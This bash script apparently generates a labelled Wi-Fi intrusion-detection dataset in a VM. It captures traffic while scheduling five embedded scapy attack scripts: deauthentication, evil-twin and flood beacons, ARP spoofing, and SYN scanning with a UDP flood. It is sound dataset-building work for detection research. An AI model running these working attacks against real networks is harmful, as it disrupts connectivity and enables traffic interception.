#!/usr/bin/env bash
# VM-side VESPER-SH generation: continuous dual-vantage capture (wlan0 ap.pcap +
# wlan2 monitor rf.pcap) for DURATION, injecting the 5-attack suite on a schedule
# with benign gaps. Records exact attack windows (VM clock) to attack_schedule.jsonl.
# Assumes vm_wifi_net.sh is up and vm_device_agent.py runs with --sync-log.
set -uo pipefail
OUT="${1:-/tmp/vsh_episode}"; DUR="${2:-600}"; CH=6
mkdir -p "$OUT"; : > "$OUT/attack_schedule.jsonl"
log(){ echo "[vsh $(date +%T)] $*"; }
AP=$(iw dev wlan0 info | awk '/addr/{print $2}')
STA=$(ip netns exec ns-sta1 iw dev wlan1 info | awk '/addr/{print $2}')

# continuous captures for the whole episode
ip link set wlan2 down; iw dev wlan2 set type monitor; ip link set wlan2 up; iw dev wlan2 set channel $CH
tshark -i wlan0 -w "$OUT/ap.pcap" -a duration:$DUR >/dev/null 2>&1 & AP_TS=$!
tshark -i wlan2 -w "$OUT/rf.pcap" -a duration:$DUR >/dev/null 2>&1 & RF_TS=$!
log "capturing ${DUR}s: ap.pcap(wlan0) rf.pcap(wlan2)  AP=$AP STA=$STA"

# attack scripts (RF from wlan2; LAN from ns-sta1 real MAC)
cat > "$OUT/a_deauth.py" <<PY
from scapy.all import RadioTap,Dot11,Dot11Deauth,sendp
for _ in range(20): sendp([RadioTap()/Dot11(addr1="$STA",addr2="$AP",addr3="$AP")/Dot11Deauth(reason=7)],iface="wlan2",verbose=False)
PY
cat > "$OUT/a_evil_twin.py" <<PY
from scapy.all import RadioTap,Dot11,Dot11Beacon,Dot11Elt,sendp
import time;t=time.time()
while time.time()-t<5:
    sendp(RadioTap()/Dot11(type=0,subtype=8,addr1="ff:ff:ff:ff:ff:ff",addr2="02:00:00:00:aa:00",addr3="02:00:00:00:aa:00")/Dot11Beacon(cap="ESS")/Dot11Elt(ID="SSID",info="VESPER-IoT-Network"),iface="wlan2",verbose=False);time.sleep(0.03)
PY
cat > "$OUT/a_beacon_flood.py" <<PY
from scapy.all import RadioTap,Dot11,Dot11Beacon,Dot11Elt,sendp,RandMAC
import time;t=time.time()
while time.time()-t<5:
    for n in range(10):
        m=str(RandMAC());sendp(RadioTap()/Dot11(type=0,subtype=8,addr1="ff:ff:ff:ff:ff:ff",addr2=m,addr3=m)/Dot11Beacon(cap="ESS")/Dot11Elt(ID="SSID",info="Free-WiFi-%d"%n),iface="wlan2",verbose=False)
    time.sleep(0.05)
PY
cat > "$OUT/a_arp_spoof.py" <<PY
from scapy.all import Ether,ARP,sendp
import time;t=time.time()
while time.time()-t<5:
    sendp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=2,psrc="10.0.0.1",pdst="10.0.0.20",hwsrc="02:00:00:00:99:00"),iface="wlan1",verbose=False);time.sleep(0.2)
PY
# lan_scan: SYN scan + UDP flood from the station's REAL MAC to the hub (propagates through AP)
cat > "$OUT/a_lan_scan.py" <<PY
from scapy.all import IP,TCP,UDP,send
import time
for p in list(range(1,200))+[1883,8080,554,80,443,22,23]:
    try: send(IP(dst="10.0.0.1")/TCP(dport=p,flags="S"),verbose=False)
    except Exception: pass
t=time.time()
while time.time()-t<3:
    send(IP(dst="10.0.0.1")/UDP(dport=1883)/(b"x"*200),verbose=False)
PY

ATTACKS=(deauth evil_twin beacon_flood arp_spoof lan_scan)
END=$(( $(date +%s) + DUR - 20 )); ROUND=0
sleep 20   # benign warm-up
while [ $(date +%s) -lt $END ]; do
  ROUND=$((ROUND+1)); A=${ATTACKS[$(( (ROUND-1) % ${#ATTACKS[@]} ))]}
  S=$(date +%s.%N)
  case "$A" in
    deauth|evil_twin|beacon_flood) python3 "$OUT/a_${A}.py" 2>/dev/null || true ;;
    arp_spoof|lan_scan) ip netns exec ns-sta1 python3 "$OUT/a_${A}.py" 2>/dev/null || true ;;
  esac
  E=$(date +%s.%N)
  echo "{\"class\":\"$A\",\"round\":$ROUND,\"start_ts\":$S,\"end_ts\":$E}" >> "$OUT/attack_schedule.jsonl"
  log "round $ROUND [$A] $S..$E"
  sleep 40   # benign gap (benign-dominant)
done
wait $AP_TS 2>/dev/null || true; wait $RF_TS 2>/dev/null || true
# tshark writes pcaps as root mode 0600; make them world-readable so `multipass
# transfer` (runs as the ubuntu user) can pull them without permission errors.
chmod 644 "$OUT"/*.pcap "$OUT"/*.jsonl 2>/dev/null || true
: > "$OUT/DONE"; log "episode done: $ROUND attack rounds"
